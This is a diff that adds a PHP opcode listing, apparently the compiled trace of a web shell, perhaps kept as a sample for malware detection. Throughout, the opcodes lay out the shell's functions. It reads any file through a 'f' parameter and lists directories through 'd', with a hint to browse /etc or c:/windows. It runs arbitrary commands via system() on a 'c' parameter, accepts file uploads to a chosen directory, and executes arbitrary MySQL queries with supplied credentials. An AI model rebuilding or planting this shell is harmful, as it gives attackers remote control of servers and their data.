@@ -1,0 +1,95 @@
+FunctionStart 
+INIT_FCALL 'ob_implicit_flush'
+DO_ICALL 
+FETCH_IS '_REQUEST'
+ISSET_ISEMPTY_DIM_OBJ 'f'
+FETCH_R '_REQUEST'
+FETCH_DIM_R 'f'
+INIT_FCALL 'fopen'
+SEND_VAL 'rb'
+DO_ICALL 
+INIT_FCALL 'fpassthru'
+DO_ICALL 
+FETCH_IS '_REQUEST'
+ISSET_ISEMPTY_DIM_OBJ 'd'
+FETCH_R '_REQUEST'
+FETCH_DIM_R 'd'
+ECHO '<pre>'
+INIT_FCALL 'opendir'
+DO_ICALL 
+ROPE_INIT '<h2>listing of '
+ROPE_END '</h2>'
+INIT_FCALL 'is_dir'
+ROPE_ADD '/'
+DO_ICALL 
+ROPE_INIT '<a href=''
+ROPE_ADD '?d='
+ROPE_ADD '/'
+ROPE_END ''><font color=grey>'
+ROPE_INIT '<a href=''
+ROPE_ADD '?f='
+ROPE_ADD '/'
+ROPE_END ''><font color=black>'
+FAST_CONCAT ' '
+ECHO '</font></a>'
+INIT_FCALL 'readdir'
+DO_ICALL 
+ECHO 'opendir() failed'
+INIT_FCALL 'closedir'
+DO_ICALL 
+FETCH_IS '_REQUEST'
+ISSET_ISEMPTY_DIM_OBJ 'c'
+ECHO '<pre>'
+INIT_FCALL 'system'
+FETCH_R '_REQUEST'
+FETCH_DIM_R 'c'
+DO_ICALL 
+FETCH_IS '_REQUEST'
+ISSET_ISEMPTY_DIM_OBJ 'upload'
+FETCH_IS '_REQUEST'
+ISSET_ISEMPTY_DIM_OBJ 'dir'
+FETCH_R '_REQUEST'
+FETCH_DIM_R 'dir'
+FETCH_DIM_R 'file_name'
+FETCH_DIM_R 'name'
+INIT_FCALL 'move_uploaded_file'
+FETCH_DIM_R 'file_name'
+FETCH_DIM_R 'tmp_name'
+DO_ICALL 
+FETCH_IS '_REQUEST'
+ISSET_ISEMPTY_DIM_OBJ 'mquery'
+FETCH_R '_REQUEST'
+FETCH_DIM_R 'host'
+FETCH_R '_REQUEST'
+FETCH_DIM_R 'usr'
+FETCH_R '_REQUEST'
+FETCH_DIM_R 'passwd'
+FETCH_R '_REQUEST'
+FETCH_DIM_R 'db'
+FETCH_R '_REQUEST'
+FETCH_DIM_R 'mquery'
+INIT_FCALL_BY_NAME 'mysql_connect'
+DO_FCALL 
+INIT_FCALL_BY_NAME 'mysql_error'
+DO_FCALL 
+CONCAT 'Could not connect: '
+INIT_FCALL_BY_NAME 'mysql_select_db'
+DO_FCALL 
+INIT_FCALL_BY_NAME 'mysql_query'
+DO_FCALL 
+ECHO '<pre><h2>query was executed correctly</h2> '
+INIT_FCALL 'print_r'
+DO_ICALL 
+INIT_FCALL_BY_NAME 'mysql_fetch_array'
+FETCH_CONSTANT 'MYSQL_ASSOC'
+DO_FCALL 
+INIT_FCALL_BY_NAME 'mysql_free_result'
+DO_FCALL 
+ECHO '<pre><form action="'
+ECHO '" METHOD=GET >execute command: <input type="text" name="c"><input type="submit" value'
+ECHO '" method="post"><input type="hidden" name="MAX_FILE_SIZE" value="1000000000"> upload '
+ECHO '?d=/etc on *nix or http://'
+ECHO '?d=c:/windows on win <hr>execute mysql query: <form action="'
+ECHO '" METHOD=GET > host:<input type="text" name="host"value="localhost"> user: <input t'
+RETURN 1
+FunctionEnd 
